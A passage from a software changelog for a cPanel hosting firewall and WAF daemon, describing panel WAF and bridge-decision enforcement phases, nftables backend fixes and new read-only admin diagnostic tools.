  high-confidence **`block`** tier acts (`block` → deny); `logonly`-tier hits are
  never enforced (observe-only by design) and `challenge`-tier hits are NOT
  turned into a standalone WAF challenge (that would loop — a solved clearance
  cookie doesn't clear the WAF match — and break non-browser clients), so
  challenge-tier enforcement waits for the clearance-aware Phase 4b decision
  path. **Merging changes nothing** — the default stays LOGONLY, so an upgrade
  never starts enforcing on the cPanel/WHM ports; the operator opts in per node
  (`CFM_PANEL_WAF=enforce`, orion first → fleet), and `CFM_PANEL_WAF=0` is the
  instant kill switch. Self-IPs / `IGNORE_NETS` are skipped, `deny` can't loop,
  and the probe is fail-open (any WAF error → normal flow), so an enforcing panel
  WAF can't lock an admin out of WHM/cPanel. The panel challenge was already
  enforced; the shared bridge **decision** stays LOGONLY until Phase 4b.
- **Edge unification Phase 4b: panel bridge-decision enforce is now available,
  opt-in (default LOGONLY), BLOCK-tier only.** `CFM_PANEL_DECISION` gains an
  `enforce` value alongside `0`/off and the default `1`/logonly, mirroring 4a. In
  `enforce`, a bridge verdict whose ip/vhost/rule action is **`block`** hard-denies
  (a plain 403, no redirect, so it can't loop); the deny applies on human-entry
  even to a client with a valid clearance cookie (web-edge parity — a blocked IP
  is blocked). The **challenge tier is deliberately not enforced from the
  verdict** — the existing clearance-aware human-entry challenge already covers
  un-cleared browsers and passes non-browsers through, so deriving a challenge
  from the verdict would duplicate it and reintroduce the loop Phase 4a avoided;
  `throttle`/other verdicts stay observe-only. **Merging changes nothing** — the
  default stays LOGONLY; the operator opts in per node (`CFM_PANEL_DECISION=enforce`,
  orion first → fleet), and `CFM_PANEL_DECISION=0` is the instant kill switch. The
  probe is fail-open (any bridge error → normal flow, no deny), so an enforcing
  decision can't lock an admin out of WHM/cPanel. `waf_fp_hunt`'s
  `panel_decision.ip_block_count` keeps counting on enforcing nodes (it keys on
  the verdict fields, not the log marker). **Note:** the "default LOGONLY / merging
  changes nothing" wording in the 4a and 4b entries above is superseded by
  Phase 4c below, which ships in the same release and flips the default to
  **enforce**.
- **Edge unification Phase 4c: panel enforcement is now config-driven and DEFAULTS
  TO ENFORCE fleet-wide.** New `detectors.conf [webdetector]` keys `PANEL_WAF_MODE`
  and `PANEL_DECISION_MODE` (`off | logonly | enforce`) control the panel WAF and
  panel bridge-decision modes, published to the edge through the existing
  `cfm_bridge_config.lua` channel (so `cfm reload` applies within ~10s, no proxy
  reload). `cfm_panel.lua` now resolves the mode **per request**: env override
  (`CFM_PANEL_WAF`/`CFM_PANEL_DECISION`, emergency kill switch) → the config value
  → **default `enforce`**. The reference `detectors.conf` ships both at `enforce`,
  and a missing key / old daemon file / unknown token also resolves to enforce —
  so a package upgrade turns panel WAF + bridge-decision enforcement **on by
  default**, no per-node config needed. **This is a deliberate posture change:**
  after upgrading, the cPanel/WHM ports enforce the high-confidence block tier.
  To hold a node back, set `PANEL_WAF_MODE`/`PANEL_DECISION_MODE = logonly` (keep
  observing) or `off` on that node and `cfm reload`. All the 4a/4b safety nets are
  unchanged (block-tier only, self-IP/`IGNORE_NETS` skipped, `deny` is a
  redirect-less 403 that can't loop, probe fail-open), so enforce-by-default cannot
  turn a WAF/bridge fault into a WHM/cPanel lockout — only a genuine block verdict
  denies. Motivation: enable enforcement across a ~20-node fleet without editing
  every node, since the deployment does not set env vars.

### Fixed
- **`make release` GitHub-release publish was silently broken by shell
  segmentation.** Three inline `# 1)/2)/3)` comment lines inside the release
  recipe's gh-block each ended the shell segment (a `#` comment without a
  trailing `\`), so `$REPO`/`$DEB_FILE`/`$RPM_FILE` set earlier were **empty** in
  the later segments, which also ran **without** `set -e`: `gh … --repo ""` and
  `gh release upload … "" "" …` with empty asset paths, each failure masked by a
  following `echo`, so `make release` printed "✅ Release published" even when
  nothing was created/uploaded. Folded the whole gh-block into one
  `set -euo pipefail` shell so the vars persist and real `gh` failures now abort
  the release instead of being swallowed.

### Added
- **MCP `cpu_throttle` — turns "load is high" into a root cause.** New
  read-only, admin-only MCP tool + `GET /api/v1/system/cpu-throttle`, backed by
  the pure `internal/cputhrottle` leaf. It reads the instantaneous
  cpufreq/thermal/loadavg signals from sysfs/proc and classifies WHY the CPU is
  loaded: `genuine_demand` (cores at/near max frequency under load — hunt the
  workload, not a fault), `thermal_throttling` (slow under load + hot / kernel
  throttle counters set — check cooling), `frequency_capped` (slow but cool —
  powersave governor or a policy cap; switch to performance), `frequency_reduced`
  (slow, cause unclear — BIOS/host cap), `low_load` (idle downclock, normal), or
  `no_cpufreq_data` (cpufreq/thermal not exposed — typical on VMs; check the
  hypervisor's CPU steal instead). The classifier is **load-gated** — a
  downclocked idle CPU is never mislabelled as throttled — and every verdict
  carries a plain-language summary plus the freq ratio, governor, temperature,
  and throttle counters behind it. Cheap synchronous read; no collector.
- **MCP `db_web_pressure` — "few web hits, high DB pressure" tenant finder.**
  New read-only, admin-only MCP tool that correlates per-account MySQL pressure
  with per-vhost web request volume: it composes `mysql/cpu` + `mysql/top` +
  `webdet/top-short`, folds DB users (`acct_*`) and vhosts up to the owning
  cPanel account (via the canonical `internal/panelmap` host→owner reader), and
  runs the `internal/dbwebcorr` join. Accounts come back most-interesting-first —
  those flagged `few_hits_high_pressure` (DB pressure above a floor **and** web
  hits at/under a ceiling) sort first, then by pressure-per-hit — each with its
  cpu_sec/busy_sec/query_count, web_rps/web_hits, db_users + vhosts. The tell for
  a runaway cron/import, an abusive backend script, or a compromised account
  grinding the DB without a matching visitor load (vs the boring "lots of traffic
  → lots of DB"). The `perf` block says whether cpu numbers are real (busy_sec is
  the CPU proxy on CloudLinux MariaDB where CPU_TIME is 0). Attribution is
  cPanel-only; on a non-cPanel host `web_attribution.vhosts_mapped` is 0 and a
  `note` flags that the few-hits verdicts are unreliable there.
- **Correlation leaf for "few web hits, high DB pressure" tenants
  (`internal/dbwebcorr`).** Pure, unit-tested join+scoring foundation that folds
  per-DB-user MySQL pressure and per-vhost web request rate up to the hosting
  account (DB user `acct_*` → `acct`; vhost → owner) and flags accounts whose
  databases are busy while their sites take almost no traffic — the tell for a
  runaway cron/import, an abusive backend script, or a compromised account
  (vs the boring "lots of traffic → lots of DB"). Now surfaced by the
  `db_web_pressure` MCP tool above.

### Changed
- **One canonical cPanel domain→owner reader (`internal/panelmap`).** The
  `/etc/userdatadomains` + `/etc/userdomains` parse used to derive scoped-MySQL
  ownership was inlined in `apiserver`; it now lives in `internal/panelmap`
  (`HostOwners` for host→single-owner, `OwnerSet` for the union used by scope
  derivation), and `apiserver` delegates to it. Behaviour-preserving (guarded by
  the existing scoped-MySQL owner tests) — this removes a parser that would
  otherwise drift as new consumers (the upcoming DB↔web correlation) need the
  same mapping (CLAUDE.md §5).
- **Doc/process: adversarial self-review is now required on every code PR**
  (`CLAUDE.md` §9). Retro-reviews of already-merged PRs surfaced real issues (the
  case-inconsistent correlation join below; a `%.2g` LVE cap misrender), so the
  review step is codified as non-optional for any change with runtime behaviour.

### Fixed
- **`internal/panelmap` domain→owner parse hardened on the scoped-auth path.**
  The line scanner now raises its buffer well above `bufio.Scanner`'s 64 KiB
  default, so an outsized `/etc/userdatadomains`/`userdomains` line can't silently
  end the scan and drop a host (which would narrow a scoped token's owner set —
  fail-closed, but wrong); a dead `want==nil` match-all branch was removed. Adds
  a >64 KiB-line regression test. (Retro-review of the panelmap extraction PR.)
- **`cfm lve` LIMIT column now renders the CPU cap exactly, and the throttle
  glyph no longer misaligns the table.** The cap was formatted with `%.2g`
  (2 significant digits), so a `15.5`-core cap printed as `16c` and a `100`-core
  cap as `1e+02c`; it now uses exact minimal-digit formatting (`15.5c` / `100c`)
  via a shared `lvestat.LimitCores` helper (killing the duplicated `10000` unit
  literal), and the web-UI Health table matches. The 🟡/🔴 throttle flag (two
  terminal cells wide, but tabwriter pads by rune count) moved to its own
  trailing `FLAG` column so it can't shift the columns to its right. Also: `cfm
  lve --json` now reflects a non-2xx status in its exit code, and an unknown
  argument/typo is an error instead of being silently ignored. (Retro-review of
  the merged LVE CLI PR.)
- **`db_web_pressure` no longer false-flags a tenant when the MySQL user's case
  differs from the userdomains owner.** The correlation joined the DB side (account
  derived from the DB user, case-preserved) against the web side (owner from the
  host→owner map, lowercase) without normalizing the key, so a mixed-case MySQL
  user (e.g. `Chris_wp` → account `Chris`) split into a separate row from its
  lowercase owner (`chris`) — the DB half then showed zero web hits and was
  wrongly flagged `few_hits_high_pressure`. The join key is now normalized on both
  sides (found by an adversarial retro-review of the merged PR). No effect on the
  common all-lowercase case.
- **Data race on the MySQL governor's perf_schema / userstat capability flags.**
  `perfSchemaOK`, `perfHasCPU`, `perfCPUActive`, `userstatsOK` and `userstatsOff`
  are written by the governor poll goroutine (`probePerfSchema`/`fetchPerfDeltas`)
  and read concurrently, without synchronization, by the HTTP handler serving
  `GET /api/v1/mysql/cpu` (`handleCPU`) — a real data race (`go test -race`
  territory) that could surface a torn/stale flag in the `mysql/cpu` response
  while the daemon (re)probes. They are now `atomic.Bool` (Store/Load), which
  keeps the poll loop lock-free and takes no lock across DB I/O. The three
  poll-goroutine-only `time.Time` retry fields are left as-is (never read
  cross-goroutine). Adds a `-race` regression test driving `handleCPU`
  concurrently with the flag writer.
- **`cfm_metrics.waf_events_1h` in the health snapshot is now the real last-hour
  WAF count, reconciled with `security_overview`'s `waf_last_hour`.** It was
  never populated by any production path (the only writer, `ApplyCounterSnapshot`,
  is test-only), so it always read `0` next to a non-zero `waf_last_hour` — a
  confusing discrepancy. `CollectSnapshotNow` now fills it from the **same**
  durable history store `/api/v1/waf/engine/summary` uses (a cheap indexed
  `COUNT(*)` of `waf_observe`+`waf_trigger` over the last rolling hour, node-wide
  — matching the summary's total), via `webdetector.WAFEventsLastHour`. The
  `cfm health` CLI additionally **stops letting WAF-event volume drive the CFM
  health badge**: a high WAF count means the WAF is working, not that the node is
  unhealthy, and now that the value is live the old 50/200 thresholds would peg a
  busy box at WARN — it stays a displayed metric only. (The sibling
  `active_blocks`/`challenge_queue`/`outbound_alerts` metrics are still unwired;
  tracked separately.)

### Changed
- **Panel WAF now honours the server's self-IPs AND `[global] IGNORE_IPS`/
  `IGNORE_NETS`, matching the web edge.** The self-origin bypass predicate
  (`is_self_origin`: self-IP set + `IGNORE_NETS` + loopback/link-local) is
  extracted from `cfm.lua` into a shared `cfm_selfip` Lua module used by both the
  web edge and `cfm_panel.lua`, so the two can't drift (a single source, per
  CLAUDE.md §5). Effect: the panel LOGONLY WAF (Phase 2e) no longer records
  would-be actions for the box's own IPs or an operator-ignored network — before
  this it only skipped loopback, so monitoring/operator traffic from a public
  self-IP or an `IGNORE_NETS` range showed up as burn-in noise. No web-edge
  behaviour change (pure extraction). The module is `require`d by `cfm.lua`
  (deployed via the installer manifest) and `pcall`-required by `cfm_panel.lua`
  (loopback-only fallback on upgrade lag).

### Added
- **MCP `lve_cpu` — per-tenant CPU pressure on CloudLinux.** New read-only,
  admin-only MCP tool + `GET /api/v1/system/lve-cpu`, backed by a new in-memory
  collector that samples `/proc/lve/list` every ~15s and computes each LVE
  tenant's CPU **cores** consumed and **% of its CPU cap** (100 = being
  throttled), plus its lCPU/nCPU limits and current EP/NPROC — hottest-first,
  `top=N`. The per-tenant companion to `mysql_pressure` for "box load is high,
  which hosting account is responsible?", and the CPU input for the few-hits/
  high-pressure correlation. The CPU-usage counter's unit was calibrated to
  nanoseconds against live CL8/CL9. `available:false` on non-CloudLinux hosts
  (the collector never starts); `ready:false` briefly at startup until two
  samples exist. Daemon-only; the CLI / web UI surface follows in a later change.
- **`cfm lve` CLI + Health-page LVE table — the presentation surface for the
  per-tenant CPU signal above.** `cfm lve` (aliases `lvetop`/`lve-top`/`lve-cpu`)
  prints the hottest CloudLinux tenants — CPU cores over the last sample
  interval, % of the tenant's lCPU cap (🟡≥70% 🔴≥90%), the cap in cores, and
  EP/NPROC — with `top <N>` and `--json`. On a non-CloudLinux host it prints a
  one-line "nothing to show"; while the collector warms up it says so. The
  cfm-admin **Health** page gains an "LVE per-tenant CPU" table fed by the same
  `/api/v1/system/lve-cpu` endpoint (refreshes on the page's existing cycle); the
  card hides itself entirely on non-CloudLinux hosts (`available:false`) and shows
  a warming-up note until the first delta is ready. No new endpoint, no new
  auth surface — both are read-only, admin-only views over the existing collector.
- **MCP `waf_fp_hunt` — panel-logonly burn-in analysis ("safe to enforce?").**
  New read-only, admin-only MCP tool + `GET /api/v1/system/waf-fp-hunt`: it scans
  the edge ERROR log for the panel LOGONLY markers (`[cfm_panel_waf]` would-be WAF
  actions from Phase 2e, `[cfm_panel_decision]` would-enforce verdicts from Phase
  2d) and returns aggregates that answer whether panel enforcement is safe to turn
  on. It SEPARATES expected internet-scanner noise (Censys/Shodan/… by user-agent)
  from the customer-facing residue — the two headline gates are
  `panel_waf.nonscanner_would_block` (non-scanner clients a panel WAF block rule
  would have blocked) and `panel_decision.ip_block_count` (bridge ip-blocks on a
  panel port) — plus per-rule/verdict breakdowns, candidate false positives (worst
  first, with sample requests) and top user-agents. Body rules are not represented
  (the panel WAF reads no request body). Same allow-listed-path, bounded-tail
  discipline as `edge_error_tail` (a new `edgelog.ScanError` streams every match in
  the window; the pure aggregator lives in `internal/panelfp`). MCP tool count
  32 → 33.
- **Panel WAF — LOGONLY (edge-unification Phase 2e).** `cfm_panel.lua` now runs
  the same `cfm_waf` ruleset the web edge uses against panel human-entry +
  generic requests and RECORDS what it would do
  (`[cfm_panel_waf] logonly=would_<action> scope=panel:<port> …` in the edge
  error log), but does **not** act on the verdict — nothing blocks or challenges
  because of the WAF, so there is zero panel-lockout risk while false-positive
  data is gathered. Reduced profile: header/URI/args/cookie only (no request
  body is read, so panel upload/rsync/websocket streams are never buffered); the
  API/SSO/`acctxfer`/transfer/`live_tail_log`/websocket allowlist is hard-skipped
  and never inspected; loopback/self traffic is skipped; per-`(ip,rule)` log
  throttle. Everything is `pcall`'d + fail-open; kill switch `CFM_PANEL_WAF=0`
  (declared `env CFM_PANEL_WAF;` in both engine confs) or a missing `cfm_waf`
  module on upgrade lag disables the probe entirely. Enforcement is a later
  opt-in phase after burn-in (see `docs/edge-unification-plan.md`).
- **MCP `edge_error_tail` — read the edge (OpenResty/Angie) ERROR log.** New
  read-only, admin-only MCP tool + `GET /api/v1/system/edge-error-log`: a
  bounded on-demand tail (last N lines, default 5000, max 200k) of the edge
  proxy's error log with an optional case-insensitive `grep`, returning the
  newest matches. This is where the in-path Lua writes `ngx.log()` — the panel
  LOGONLY decision verdicts (`[cfm_panel_decision] logonly=would_enforce …`),
  module-load failures, and Lua runtime errors — none of which the access-log
  ring behind `edge_access_tail` can carry. Same allow-listed-path, tail-window
  + timeout + capped-output discipline as `ip_forensics`/`mysql_log_tail` (no
  continuous cost). The `internal/edgelog` resolver gains an error-log
  candidate set (`…/error.log` for OpenResty/Angie/nginx) alongside the
  existing access-log one.

### Fixed
- **`cfm health` no longer reports the "Web stack - Edge Interceptor" line as
  `[CRIT]` because of the idle alternate edge engine.** A node fronts traffic
  with exactly one engine (Angie OR OpenResty); the other typically lingers as a
  disabled leftover unit reporting `state=failed`. The web-stack roll-up
  escalated to CRIT on *any* failed edge-engine row, so on an Angie node the
  dead OpenResty leftover forced a false CRIT even though every sub-check was OK.
  The roll-up now only lets the **active** edge engine's state (from
  `edge_service`, falling back to the DNAT frontend) drive the badge — a failed
  idle alternate is ignored, an unresolved active edge still fails safe. Same
  "which engine is the edge" rule the `whats_wrong` roll-up already applies.

### Removed
- **The legacy per-IP challenge-DNAT machinery is deleted (edge-unification
  Phase 1b).** Gone from both firewall backends: `AddChallenge`/`RemoveChallenge`,
  `SetChallengeRedirectEnabled`/`CleanupChallengeRedirect`/`EnsureChallengeRedirect`,
  the nft `challenge_guard` chain machinery and the `challenge_v4`/`challenge_v6`
  set creation, and nftlib's challenge DNAT namespace (`dnatWantedSpecs` incl. the
  challenge-scoped `self_v4/v6` redirect specs — the self sets themselves and the
  base input accept rules are untouched). The challenge server's legacy HTTPS
  listener (daemon-terminated TLS on `CHALLENGE_HTTPS_LISTEN`, default 9099) and
  the DNAT-era pre-auth login-challenge subsystem are removed with it; the
  post-solve release is bridge-only. `EnsureBase` now performs a one-shot legacy
  cleanup (drops leftover `challenge_v4`/`v6` sets and flushes a stale
  `challenge_guard`) so upgraded nodes shed old state. The
  `GET /api/v1/firewall/challenge/list` endpoint and the `challenge_ip_status`
  MCP tool are retired with the sets they dumped (they served their diagnostic
  purpose during the 2026-08-11 incident). No behavior change on any fleet node:
  in edge mode nothing ever populated the sets, and the enforcement path
  (bridge + Lua clearance cookie) is untouched.

### Changed
- **Panel challenge solves now carry a TLS fingerprint (edge-unification
  Phase 2b).** The cPanel/WHM/DirectAdmin listeners' `/__cfm_verify` location
  previously ran a bare `access_by_lua_block { return; }`, so panel solves
  logged `tls_fp=-` — the fingerprint's one structural blind spot. It now runs
  the same clear-then-`cfm_tlsfp.stamp()` the web edge does (the panel
  listeners terminate TLS, so `$ssl_ciphers`/`$ssl_curves` are available), so
  panel solves record a fingerprint like web solves. Verify-only, matching the
  web edge: `/__cfm_challenge` records no solve and stays bare. Plain-HTTP
  panel ports (2082/2086/2095) correctly still resolve to no fingerprint (no
  handshake). Still log-first — nothing decides on the value yet.
- **Challenge status/reporting swept clean of DNAT-era probes (edge-unification
  Phase 1c — closes Phase 1).** `cfm status`'s challenge section is now
  journal-driven only (challenged/solved totals since service start; the nft
  set listings and DNAT-rule probes are gone, and the section only prints when
  there is something to show). `cfm firewall-status` no longer publishes the
  retired `dnat_challenge`/`challenge_redirect` feature checks at all
  (previously reported N/A); `dnat_edge` remains the only DNAT check.
  `challenge_v4`/`challenge_v6` and the `challenge_ips` alias are removed from
  the set inventory and from `cfm ip` set classification. `CHALLENGE_HTTP_LISTEN`
  / `CHALLENGE_HTTPS_LISTEN` in `cfm.conf` are now parsed as tolerated no-ops
  (the challenge listener is configured in `detectors.conf`; the HTTPS one is
  retired). Reference `cfm.conf` drops 9099 from `TCP_IN`; README, the
  edge-unification plan, and the firewall-backend roadmap updated to match.
- **Edge mode is now the only mode — `OPENRESTY_MODE` is deprecated and
  ignored (edge-unification Phase 1a).** The OpenResty/Angie decision bridge
  is always constructed and always serves; the webdetector no longer has a
  DNAT-mode branch. Setting `OPENRESTY_MODE = 0` only logs a deprecation
  warning. The legacy per-IP challenge redirect is force-disabled and cleaned
  up on every start (the machinery itself is deleted in Phase 1b), the
  DNAT-era pre-auth login challenge is permanently disabled (subsystem also
  removed in 1b), and the status/diagnostics readers (`cfm status` bridge
  panel, edge probe, `cfm firewall-status`) treat the edge as always-on
  instead of re-parsing the deprecated key — `dnat_edge` is always expected,
  `dnat_challenge`/`challenge_redirect` always N/A. Reference `detectors.conf`
  section 13 updated accordingly. No enforcement behavior changes on any
  fleet node: every node already ran `OPENRESTY_MODE = 1`.

### Added
- **Edge-unification design doc** (`docs/edge-unification-plan.md`): the
  accepted plan to make edge mode the only mode — retire the legacy per-IP
  nft challenge-DNAT (`challenge_v4/v6`, `EnsureChallengeRedirect`,
  `challenge_guard`, the daemon's 9099 TLS interception) and the
  `OPENRESTY_MODE` toggle, and converge the panel listeners (12xxx) on the full
  in-path pipeline via shared Lua modules. Grounded in two full-surface scans;
  `cfm dnat` / `cfm dnat cpanel` (edge + panel routing) are explicitly kept.

### Added
- **Panel LOGONLY bridge decision (edge-unification Phase 2d).** The cPanel/WHM/
  DirectAdmin listeners now consult the same `/nginx/decision` bridge the web
  edge uses (`scope=panel:<port>`) on human-entry and fire `/nginx/ok/touch`
  after a valid clearance, so panel traffic gets a per-IP/host/rule verdict and
  the bridge learns that an IP passed on a panel scope. It is **log-only**:
  when the bridge would block/challenge, the panel logs
  `[cfm_panel_decision] logonly=would_enforce …` but does **not** act on it —
  the clearance-cookie challenge is unchanged, so there is no new way to lock an
  admin out of WHM/cPanel. This gathers false-positive data before any panel
  enforcement lands. Fully fail-open and `pcall`-guarded; disable with
  `CFM_PANEL_DECISION=0`. Under the hood the decision-RPC client (unix-socket
  transport + `/nginx/decision` verdict with clean-allow caching) is extracted
  from `cfm.lua` into a shared, requirable `cfm_decision.lua` module with **zero
  behaviour change on the web path** (the three F38/F45/F47 decision regression
  tests now exercise the module directly).

### Fixed
- **Edge log auto-detection now picks the ACTIVE engine's log, not a stale
  leftover.** `internal/edgelog` selected the first *existing* candidate in a
  static "OpenResty-before-Angie" order, so on an Angie-fronted node the
  disabled OpenResty install's leftover (stale/empty) `error.log` was chosen
  over the live Angie one — `edge_error_tail` returned zero lines by default
  (caught live: it read an empty `/usr/local/openresty/nginx/logs/error.log`
  while the panel `logonly` verdicts were in `/var/log/angie/error.log`). The
  resolver now defaults to the most-recently-modified candidate (the active
  edge is the one being written), fixing `edge_error_tail` and, latently,
  `ip_forensics` on nodes where both engines' log files exist. An explicit
  `source=` still overrides.
- **`whats_wrong` no longer reports a spurious critical for the idle edge
  engine.** On a node fronted by Angie, the installed-but-disabled
  `openresty.service` (the mutually-exclusive alternate) sits `failed`, and
  `whats_wrong` flagged it as a critical "service failed" even though the edge
  was perfectly healthy. It now resolves the active edge from the health
  snapshot's `runtime.edge_service` and suppresses failed/inactive findings for
  an edge engine (`angie`/`openresty`/`nginx`) that isn't the active one — the
  active edge's own health is still evaluated authoritatively (edge_status /
  frontend_working). Fail-safe: suppression applies only when the active edge
  resolved to a KNOWN engine; the collector's unresolved sentinel (`unknown`)
  and a missing health section are not known engines and suppress nothing, so a
  genuinely-failed active edge is never masked.
- **Web and panel clearance cookies no longer clobber each other
  (edge-unification Phase 2a).** Browsers do not isolate cookies by port, so
  the single shared `cfm_clearance` name on `Path=/` meant solving a panel
  challenge (`:2083/:2087/...`) overwrote the web clearance and vice versa —
  the recurring "solved but still challenged" loop the panel loop-breaker
  masks. The challenge server now mints panel clearances under a per-scope
  name (`cfm_clearance_p<port>`; web keeps `cfm_clearance`), and
  `cfm_panel.lua` reads the scoped name first, still accepts a panel-scoped
  token under the legacy shared name (upgrade lag — scope validation is
  HMAC-bound either way), and re-mints under the scoped name so old cookies
  migrate forward. The loop-breaker stays as a safety net for the upgrade
  window and will be removed after burn-in. Existing clearances survive:
  web cookies are untouched, panel cookies revalidate via the fallback.
- **Edge Lua drift fixes (edge-unification Phase 0).** Five long-standing
  divergences between the web (`cfm.lua`) and panel (`cfm_panel.lua`) paths:
  (1) the panel-subdomain prefix lists had drifted (`cfm.lua` knew `mail.` but
  not `webdisk.`, `cfm_panel.lua` the reverse) — now one shared module,
  `cfm_panel_hosts.lua`, with the old inline lists kept as upgrade-lag
  fallbacks; (2) the clearance-cookie lifetime diverged three ways (daemon
  mints `CHALLENGE_COOKIE_LIFE`, web Lua re-mints 3600s, panel Lua re-mints a
  hardcoded 2700s) — the daemon now publishes its authoritative
  `cookie_life_sec` in `cfm_bridge_config.lua` (same resolver as
  `SetCookieLife`, so it can never drift) and both Lua paths prefer it;
  (3) `lua_shared_dict cfm_panel_state` is now declared in both engine configs,
  making the panel verify-trace functional instead of silently dead — exactly
  the debug instrument the 2026-08-11 clearance-loop incident needed;
  (4) removed the dead `$cfm_panel_fail_mode` from the panel listener template
  (set in 7 blocks, read by nothing — the real policy is `CFM_PANEL_FAIL_OPEN`);
  (5) `cfm firewall-status` no longer mislabels `dnat_challenge=true` on
  OpenResty/edge nodes where the daemon has explicitly disabled and cleaned up
  the challenge redirect.
- **nftlib: serialize all shared-netlink-socket reads under the backend mutex —
  fixes a connection desync that wedged the firewall backend.** `b.conn` (a single
  `*nftables.Conn` / netlink socket) is not safe for concurrent use, but four
  telemetry/feed read paths released `b.mu` before reading it
  (`DumpFloodCounters`' `GetObjects`, `getSetIPStrings`/`dumpPortscanPairsNative`'s
  `GetSetElements`, `listSetsByPrefix`' `GetSets`). Racing a locked writer on the
  same socket produced `unexpected header type` (observed live as
  `[flood] cannot list counters: unexpected header type`) and left the socket
  desynced, after which subsequent operations could hang holding `b.mu` — wedging
  every firewall op, including the post-solve challenge release (which is what
  turned into the "Checking your browser" loop). All four now hold `b.mu` across
  the read; the shared connection is only ever touched under the lock.
- **Challenge solve no longer blocks on the firewall backend in edge mode — fixes
  an endless "Checking your browser" loop on nftlib nodes.** In OpenResty/edge
  mode the challenge is enforced in-path (Lua clearance cookie) and the source IP
  is never added to the nft challenge set — yet the `/verify` solve handler still
  called `RemoveChallenge(ip)` on the firewall backend before setting the
  `cfm_clearance` cookie. On the nftlib backend that call serializes on a shared
  mutex which a wedged netlink connection can hold for a long time (observed:
  `/__cfm_verify` hanging 1–234s → HTTP 499), so the clearance cookie was never
  set and every reload re-served the challenge page — an endless loop for real
  visitors. The post-solve release is now a single shared helper
  (`releaseSolvedIP`) that, in edge mode, ONLY clears the bridge and never touches
  the firewall backend (the intended "solve → ClearIP instead of nft remove"
  design); DNAT mode is unchanged. (The underlying nftlib shared-connection wedge
  is tracked separately.)
- **`challenge_ip_status` MCP tool + `GET /api/v1/firewall/challenge/list`
  (admin-only): dump the DNAT challenge sets with per-IP TTL.** The live
  instrument for a "stuck in an endless Checking-your-browser loop" report on a
  DNAT node — it shows whether a just-solved IP is still a member of
  `challenge_v4`/`challenge_v6` (release failed to clear it) or keeps reappearing
  with a fresh TTL (the engine re-challenges it faster than any solve cooldown).
  Poll it: a `ttl_sec` that resets across calls is a re-add, one that counts down
  is aging out. Empty sets are normal in edge/OpenResty mode (there the gate is
  the Lua clearance cookie, not an nft set). Read-only; reuses the existing
  `ListSetElementsTimed` backend read on both nft and nftlib.

### Fixed
- **nftlib: deleting a set element that isn't present is no longer an error
  (parity with exec-nft), and challenge-release failures are now logged.** The
  exec-nft backend has always tolerated "delete a non-member" (`Could not delete
  element` / ENOENT) as a no-op; the nftlib backend returned the raw netlink
  error instead. That error was harmless only because the challenge-release path
  discarded it (`_ = s.fw.RemoveChallenge(ip)`) — which also meant a *real*
  failure to remove a solved IP from `challenge_v4` (leaving it DNAT-redirected
  into an endless "Checking your browser" loop) left no trace at all. `delIPElem`
  /`delCIDRElem` now swallow not-found (matching nft), and the release sites in
  `challenge_server.go` log a genuine `RemoveChallenge`/`AddChallengeOK` failure
  (`[challenge] release ERROR: …`) instead of dropping it. No behaviour change
  for a successful release; benign "already absent" stays silent.
- **nftlib: large CIDR/nets feeds now apply (de-overlap before writing).** An
  interval (`*_nets`) feed set with overlapping/adjacent CIDRs was rejected by
  the kernel with `netlink receive: directory not empty` (ENOTEMPTY) — observed
  on a 284-entry `*_nets` allowlist, which therefore wasn't applied on the nftlib
  backend (the exec-nft backend already de-overlapped these in software, which is
  why only nftlib was affected). The CIDR canonicalize/dedup/drop-overlaps logic
  is now a single shared implementation in `internal/firewall/feedutil`
  (`NormalizeCIDRsV4/V6`, moved verbatim from the nft backend so both backends
  use one copy and can't drift), and nftlib applies it to `*_nets` sets before
  writing — matching the nft backend. The set-name→family selection is also
  shared (`NormalizeNetsForSet`): it keys on whichever `_v{4,6}_nets` token
  appears first (the real family marker, never a feed-name echo in the suffix)
  and the normalizers now skip wrong-family CIDRs instead of indexing blindly —
  closing a latent crash where a feed literally named e.g. "block v4 nets" made
  its IPv6 set name contain `_v4_nets`, ran the v4 range math over v6 CIDRs, and
  panicked the (recover-less) feed goroutine into a restart loop.
- **nftlib: stop the every-tick `EnsureBase` that drove a slow daemon restart
  loop.** On the nftlib backend `LoadPortScanner` called `EnsureBase` every tick
  (~20s), and `EnsureBase`'s cost is its CLI part (`refreshSelfSets` +
  `applyBaseInputRules` fork ~26 `nft` subprocesses). Those forks get slower as
  the ruleset grows over a run, so `EnsureBase` climbed from ~0.7s to ~16s over a
  couple of hours until the daemon missed its heartbeat and the watchdog
  restarted it (seen on a busy nftlib node; exec-nft nodes were unaffected).
  `LoadPortScanner` now only calls `EnsureBase` when the table is actually
  missing (mirroring `DumpFloodCounters`), so the base ruleset is still
  self-healed but not needlessly re-reconciled every tick. The
  `firewall_selftest` split (lock_wait/nl_work/cli_work) confirmed the cost was
  entirely `cli_work`. Diagnosed via the new `firewall_selftest` tool.
- **nftlib: large blocklist/allowlist feeds now apply (chunked writes) and
  unchanged feeds are skipped.** A feed set was written in ONE netlink
  `SetAddElements`+`Flush`; a large feed (observed: a 113k-entry blocklist)
  overflowed the socket buffer and failed with `sendmsg: message too long`, so
  that blocklist was silently NOT enforced on the nftlib backend. Set writes are
  now split into bounded batches so any size applies. Additionally, a full
  replace of a PERMANENT (no-TTL) set whose content is unchanged since the last
  successful apply is now a no-op (a blocklist that didn't change this hour is
  not needlessly rewritten); the content cache is dropped on any structural
  change (`invalidateCache`) so a recreated/flushed set is always rewritten. TTL
  sets are always rewritten (their kernel contents expire). Interval sets
  (CIDR/nets feeds) additionally had their flush issued as a SEPARATE netlink
  transaction — flushing and re-adding an interval set in one batch failed with
  `netlink receive: directory not empty` (observed on a `*_nets` allowlist feed),
  and their start/interval-end element pairs are never split across batches.
- **`/unblock` now responds within a bounded budget regardless of firewall
  backend speed.** The pre-response fast path (nft point-lookup + remove, WAF
  clear) previously ran the nft work synchronously and unbounded; on a busy node
  under exec-engine nft lock contention it could stall for seconds, so cfm-web
  hit its ~1.2s node-call deadline and reported a healthy node "unreachable"
  even though the unblock had actually succeeded. The fast path now runs under a
  single ~800ms response budget; whatever doesn't finish is completed by the
  existing fire-and-forget cleanup goroutine (which already calls
  `RemoveBlock` idempotently — a slow backend can never leave the IP blocked,
  only defer removal by a moment). The response gains a `fastpath_done` flag
  (false ⇒ `was_blocked`/`waf` not yet authoritative; cleanup still guarantees
  the removal). Backend-agnostic — the durable fix for the incident that
  `CFM_FIREWALL_ENGINE=nftlib` worked around on one node.

### Added
- **nftlib self-diagnostics + `firewall_selftest` MCP tool.** The nftlib firewall
  backend now records a bounded, read-only self-test: each `EnsureBase` call is
